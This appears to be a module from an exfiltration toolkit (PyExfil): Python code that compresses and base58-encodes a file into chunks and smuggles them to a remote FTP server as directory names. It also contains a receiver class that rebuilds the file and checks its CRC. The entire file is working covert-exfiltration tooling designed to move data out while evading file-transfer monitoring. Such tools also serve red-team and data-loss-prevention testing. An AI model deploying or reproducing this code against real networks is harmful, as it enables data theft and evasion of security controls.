#!/usr/bin/env python3

import os
import sys
import zlib
import time
import base58

from ftplib import FTP, FTP_TLS
from operator import itemgetter

from pyexfil.includes.base import NetworkModule

OKAY = 0
ERR = -1

DELIMITER = "-"
CHUNKS_SIZE = 127
SLEEP = 0.01


class GetContent():
    def __init__(self, dir="."):
        self.file_content = None
        self.dir = dir

    def get_file(self):
        self.decode_file()
        file_name = None
        crc = None
        for i in self.file_content:
            if len(i.split(DELIMITER)) == 3:
                header = i.split(DELIMITER)
                file_name = header[1]
                crc_raw = base58.b58decode(header[2].strip())
                crc = int(crc_raw)

        dd_list = []
        for chunk in self.file_content:
            try:
                a = chunk.split(DELIMITER)
                if int(a[0]) == 0:
                    continue
                else:
                    dd_list.append([int(a[0]), a[1]])
            except Exception:
                sys.stderr.write("\t[-]\tError with chunk '%s'.\n" % chunk)
        dd_list = sorted(dd_list, key=itemgetter(0), reverse=False)

        raw_parts = []
        for chunk in dd_list:
            try:
                raw_parts.append(base58.b58decode(chunk[1].strip()))
                sys.stdout.write("\t[+]\tDecoded chunk %s.\n" % chunk[0])
            except Exception:
                sys.stderr.write("\t[-]\tError with chunk '%s'.\n" % chunk[0])

        raw_file = b"".join(raw_parts)
        raw_file = zlib.decompress(raw_file)

        if zlib.crc32(raw_file) == crc:
            sys.stdout.write("\t[+]\tCRC32 is matching in file %s.\n" % file_name)
            with open(file_name, 'wb') as f:
                f.write(raw_file)
        else:
            sys.stdout.write(
                "\t[-]\tCRC32 is NOT matching in file %s.\n\t\tSaving anyway.\n"
                % file_name
            )
            with open(file_name + "_badCRC", 'wb') as f:
                f.write(raw_file)

    def decode_file(self):
        d = self.dir
        all_dirs = [os.path.join(d, o) for o in os.listdir(d)
                    if os.path.isdir(os.path.join(d, o))]
        rel_dirs = [i[2:] for i in all_dirs]
        sys.stdout.write("\t[+]\tTotal of %s relevant directories.\n" % len(rel_dirs))
        self.file_content = rel_dirs


class FTPExfiltrator(NetworkModule):
    MODULE_NAME = "FTP"
    PROTOCOL = "ftp/tcp"

    def __init__(self, file2exfil, server, port=21, creds=(), tls=False, verbose=False):
        super().__init__(host=server, port=port, verbose=verbose)

        self.file_chunks = None
        self.file_crc = None
        self.final_chunks = None

        self.file_path = file2exfil
        self.file_name = str(file2exfil.split("/")[-1])

        self.auth_flag = creds != ()
        self.creds = creds if creds != () else ()
        self.tls_flag = bool(tls)

    def get_file_chunks(self):
        raw_content = self._get_file_content()
        if raw_content == ERR:
            return ERR
        self.file_chunks = self._split_file(raw_content)

    def _split_file(self, raw_content):
        raw_content = zlib.compress(raw_content, 9)
        a = list(raw_content[0 + i:CHUNKS_SIZE + i]
                 for i in range(0, len(raw_content), CHUNKS_SIZE))
        b = [base58.b58encode(i) for i in a]
        sys.stdout.write("\t[+]\tFile encoded with %s chunks.\n" % len(b))
        return b

    def _get_file_content(self):
        try:
            with open(self.file_path, 'rb') as f:
                all_content = f.read()
        except IOError as err:
            sys.stderr.write("Could not read file %s.\n%s\n"
                             % (self.file_name, err))
            return ERR
        except Exception:
            sys.stderr.write("Unknown error occurred.\n")
            return ERR

        raw_crc = str(zlib.crc32(all_content)).encode()
        self.file_crc = base58.b58encode(raw_crc)
        if isinstance(self.file_crc, bytes):
            self.file_crc = self.file_crc.decode()
        sys.stdout.write("\t[+]\tRead file %s.\n" % self.file_name)
        return all_content

    def build_final_chunks(self):
        if self.file_chunks is None:
            return ERR

        final_chunks = []
        file_crc_str = (self.file_crc.decode()
                        if isinstance(self.file_crc, bytes) else self.file_crc)
        final_chunks.append("0" + DELIMITER + self.file_name
                            + DELIMITER + file_crc_str)
        sys.stdout.write("\t[+]\tSending file name '%s' with CRC32 '%s'.\n"
                         % (self.file_name, file_crc_str))
        chunk_id = 1
        for i in self.file_chunks:
            chunk_str = i.decode() if isinstance(i, bytes) else i
            final_chunks.append(str(chunk_id) + DELIMITER + chunk_str)
            chunk_id += 1
        self.final_chunks = final_chunks

    def send_chunks(self):
        if self.final_chunks is None:
            return ERR

        if self.tls_flag:
            if self.auth_flag:
                ftp_obj = FTP_TLS(host=self.host, user=self.creds[0],
                                  passwd=self.creds[1])
            else:
                ftp_obj = FTP_TLS(host=self.host)
        else:
            if self.auth_flag:
                ftp_obj = FTP(host=self.host, user=self.creds[0],
                              passwd=self.creds[1])
            else:
                ftp_obj = FTP(host=self.host)

        try:
            ftp_obj.login()
            sys.stdout.write("\t[+]\tConnected to server %s.\n" % self.host)
        except Exception:
            sys.stderr.write("\t[-]\tCould not login to the server.\n")
            return ERR

        for chunk in self.final_chunks:
            ftp_obj.mkd(chunk)
            time.sleep(SLEEP)

        ftp_obj.quit()
        sys.stdout.write("\t[+]\tWrote %s(+1) folders.\n"
                         % (len(self.final_chunks) - 1))
        return OKAY

    def _send_impl(self, data, **kwargs):
        self.file_path = data
        self.file_name = str(data.split("/")[-1])
        if self.get_file_chunks() == ERR:
            return False
        if self.build_final_chunks() == ERR:
            return False
        result = self.send_chunks()
        return result == OKAY

    def _listen_impl(self, callback, **kwargs):
        raise NotImplementedError(
            "FTPExfiltrator is send-only. Use GetContent for receiving."
        )


if __name__ == "__main__":
    sys.stdout.write(
        "This is meant to be a module for python and not a stand alone executable\n"
    )
